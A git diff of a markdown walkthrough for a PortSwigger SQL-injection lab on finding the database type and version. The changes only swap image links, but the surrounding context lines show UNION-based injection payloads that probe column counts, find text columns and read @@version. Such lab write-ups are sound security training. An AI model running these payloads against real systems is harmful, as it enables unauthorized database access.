@@ -18,8 +18,6 @@ We find a message delivered during lab practice displayed as garbled text on the
 SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 #
 ```
 
-![image]()
-
 #### Determine column which has text data -
 
 ```sql
@@ -27,8 +25,6 @@ SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'shebu','cys'
 ```
 
 Both the columns have text data since both returns the same i/p value.
-
-![image]()
 
 #### Retreive db version 
 
@@ -43,7 +39,7 @@ SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT @@version,NUL
 
 #### Solution on Webpage
 
-![image]()
+![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/53d6f1b85301c244c5a590a804267ec053f3c3b7/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft/Images/Solution%20on%20Webpage.png)
 
 ![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/fba74303ae81bb6123d3060c79d0bddae0c99593/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft/Images/Lab%20Solution.png)
 
